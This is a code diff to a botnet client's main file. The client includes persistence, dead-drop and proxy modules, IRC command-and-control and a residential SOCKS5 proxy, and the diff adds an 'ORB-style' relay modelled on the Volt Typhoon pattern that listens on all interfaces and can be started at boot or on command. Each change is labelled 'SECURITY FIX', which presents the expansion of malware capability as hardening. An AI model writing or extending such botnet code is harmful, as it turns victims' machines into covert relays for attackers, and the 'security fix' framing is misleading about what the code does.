@@ -11,6 +11,7 @@
 #include "persist.h"
 #include "deaddrop.h"
 #include "proxy.h"
+#include "relay.h"
 #include "util.h"
 #include <stdio.h>
 #include <stdlib.h>
@@ -100,6 +101,12 @@ static int init_bot(void) {
      * is configured (fail-closed). */
     g_bot.proxy_enabled = PROXY_DEFAULT_ENABLED;
     g_bot.proxy_port = PROXY_DEFAULT_PORT;
+
+    /* SECURITY FIX (#91): ORB-style single-hop relay (Volt Typhoon
+     * pattern). Off by default; the accept thread only starts when
+     * relay_enabled=1 AND a relay_token is configured (fail-closed). */
+    g_bot.relay_enabled = RELAY_DEFAULT_ENABLED;
+    g_bot.relay_port = RELAY_DEFAULT_PORT;
     
     /* Set default C2 config.
      * SECURITY FIX (#87): IRC C2 is deprecated — trivially sinkholed and
@@ -200,6 +207,17 @@ static int init_bot(void) {
         }
     }
 
+    /* SECURITY FIX (#91): Environment variable fallback for the relay
+     * token if not set in config. Without a token the relay refuses to
+     * start (fail-closed). */
+    if (g_bot.relay_token[0] == '\0') {
+        const char *env_tok = getenv("NOTNET_RELAY_TOKEN");
+        if (env_tok) {
+            strncpy(g_bot.relay_token, env_tok, sizeof(g_bot.relay_token) - 1);
+            g_bot.relay_token[sizeof(g_bot.relay_token) - 1] = '\0';
+        }
+    }
+
     /* SECURITY FIX (#5): Environment variable fallback for auth nicks */
     if (g_bot.c2_irc.auth_nick_count == 0) {
         const char *env_nicks = getenv("NOTNET_IRC_AUTH_NICKS");
@@ -252,6 +270,9 @@ static void cleanup_bot(void) {
     /* SECURITY FIX (#89): stop the residential SOCKS5 proxy accept thread
      * if it was started at boot or via 'proxy on'. */
     proxy_stop();
+    /* SECURITY FIX (#91): stop the ORB relay accept thread if it was
+     * started at boot or via 'relay on'. */
+    relay_stop();
     
     /* Flush logs */
     log_flush();
@@ -288,6 +309,18 @@ int main(void) {
         } else {
             log_warn("SOCKS5 proxy failed to start on port %u",
                      (unsigned)g_bot.proxy_port);
+        }
+    }
+
+    /* SECURITY FIX (#91): ORB-style single-hop relay. Starts the accept
+     * thread at boot only when relay_enabled=1 AND a relay_token is
+     * configured; 'relay on' can also start it at runtime. */
+    if (g_bot.relay_enabled && g_bot.relay_token[0] != '\0') {
+        if (relay_start(&g_bot) == 0) {
+            log_info("RELAY relay started on 0.0.0.0:%d", relay_get_port());
+        } else {
+            log_warn("RELAY relay failed to start on port %u",
+                     (unsigned)g_bot.relay_port);
         }
     }
     
